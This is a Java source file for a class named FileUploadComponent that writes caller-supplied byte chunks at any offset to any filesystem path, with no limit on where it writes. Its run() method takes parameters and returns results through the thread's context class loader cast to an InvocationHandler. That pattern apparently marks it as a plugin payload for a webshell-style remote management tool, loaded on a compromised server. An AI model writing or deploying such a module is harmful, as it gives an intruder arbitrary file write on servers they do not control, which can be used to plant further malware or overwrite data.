package org.leo.core.component;

import java.io.File;
import java.io.RandomAccessFile;
import java.nio.charset.Charset;
import java.util.HashMap;

/**
 * 文件上传组件
 * 提供文件分块上传功能，兼容Java 6+
 *
 * @author LeoSpring
 * @version 2.1
 */
public class FileUploadComponent implements Runnable {

    private static final int MAX_CHUNK_SIZE = 1048576;
    private static final Object[] UPLOAD_LOCKS = new Object[32];

    static {
        for (int i = 0; i < UPLOAD_LOCKS.length; i++) {
            UPLOAD_LOCKS[i] = new Object();
        }
    }

    private HashMap<String, Object> params;
    private HashMap<String, Object> results;

    public void run() {
        java.lang.reflect.InvocationHandler h = (java.lang.reflect.InvocationHandler) Thread.currentThread().getContextClassLoader();
        try {
            params = (HashMap) h.invoke(null, null, null);
            results = new HashMap();
            invoke();
        } catch (Throwable t) {
            if (results == null) results = new HashMap();
            setResult(500, t.getMessage() != null ? t.getMessage() : t.getClass().getName());
        }
        if (results != null) {
            try { h.invoke(null, null, new Object[]{results}); } catch (Throwable ignored) {}
        }
    }

    /**
     * 文件上传（线程安全）
     */
    public void invoke() throws Exception {
        Object dataObj = params.get("data");

        String path = getStringParam("path");
        if (path == null || path.length() == 0) {
            setResult(400, "path 不能为空");
            return;
        }
        if (!(dataObj instanceof byte[])) {
            setResult(400, "data 必须是 byte[]");
            return;
        }
        byte[] data = (byte[]) dataObj;
        if (data.length > MAX_CHUNK_SIZE) {
            setResult(413, "data 超过 1MB 分块上限");
            return;
        }

        Long parsedOffset = getLongParam("offset", 0L);
        if (parsedOffset == null) {
            setResult(400, "offset 必须是整数");
            return;
        }
        long offset = parsedOffset.longValue();
        if (offset < 0L) {
            setResult(400, "offset 不能为负数");
            return;
        }
        if (offset > Long.MAX_VALUE - data.length) {
            setResult(400, "offset 与数据长度之和溢出");
            return;
        }

        File file = new File(path);
        long fileLength;
        synchronized (uploadLockFor(file)) {
            if (file.exists() && file.isDirectory()) {
                throw new IllegalArgumentException("path 指向目录: " + path);
            }
            if (!file.exists() && !file.createNewFile()) {
                throw new IllegalStateException("无法创建文件: " + path);
            }

            RandomAccessFile outputFile = null;
            try {
                outputFile = new RandomAccessFile(file, "rw");
                outputFile.seek(offset);
                outputFile.write(data);
            } finally {
                closeQuietly(outputFile);
            }
            fileLength = file.length();
        }
        results.put("code", Integer.valueOf(200));
        results.put("bytesWritten", Integer.valueOf(data.length));
        results.put("nextOffset", Long.valueOf(offset + data.length));
        results.put("fileLength", Long.valueOf(fileLength));
    }

    private void setResult(int code, String message) {
        results.put("code", Integer.valueOf(code));
        results.put("msg", message);
    }

    private void closeQuietly(java.io.Closeable resource) {
        if (resource == null) return;
        try { resource.close(); } catch (Exception ignored) {}
    }

    private Object uploadLockFor(File file) throws Exception {
        int hash = file.getCanonicalPath().hashCode() & 0x7fffffff;
        return UPLOAD_LOCKS[hash % UPLOAD_LOCKS.length];
    }

    private String getStringParam(String key) {
        Object value = params.get(key);
        if (value == null) return null;
        if (value instanceof byte[]) return new String((byte[]) value, Charset.forName("UTF-8"));
        return String.valueOf(value);
    }

    private Long getLongParam(String key, long defaultValue) {
        Object value = params.get(key);
        if (value == null) return Long.valueOf(defaultValue);
        if (value instanceof Number) return Long.valueOf(((Number) value).longValue());
        try { return Long.valueOf(Long.parseLong(getStringParam(key).trim())); }
        catch (NumberFormatException ignored) { return null; }
    }
}
